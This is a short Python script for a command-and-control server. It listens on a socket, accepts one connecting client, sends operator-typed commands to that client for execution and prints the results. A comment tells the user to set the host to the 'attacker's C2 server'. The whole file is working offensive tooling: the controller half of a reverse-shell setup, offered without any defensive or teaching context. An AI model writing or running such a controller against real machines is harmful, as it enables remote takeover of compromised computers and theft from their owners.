import socket
import subprocess

class C2Server:
  def __init__(self):
    self.SERVER_HOST = "0.0.0.0" # Change this to attacker's C2 server
    self.SERVER_PORT = 5003
    self.BUFFER_SIZE = 1024 # 1kb
  
  def run_server(self) -> None:
    s = socket.socket()
    s.bind((self.SERVER_HOST, self.SERVER_PORT))
    s.listen(5)
    print(f"Listening as {self.SERVER_HOST}:{self.SERVER_PORT} ...")
    client_socket, client_address = s.accept()
    print(f"{client_address[0]}:{client_address[1]} Connected!")
    while True:
      # get the command from prompt
      command = input("Enter the command you wanna execute:")
      # send the command to the client
      client_socket.send(command.encode())
      if command.lower() == "exit":
          # if the command is exit, just break out of the loop
          break
      # retrieve command results
      results = client_socket.recv(self.BUFFER_SIZE).decode()
      # print them
      print(results)
    # close connection to the client
    client_socket.close()
    # close server connection
    s.close()

    
if __name__ == "__main__":
  s = C2Server()
  s.run_server()
      
    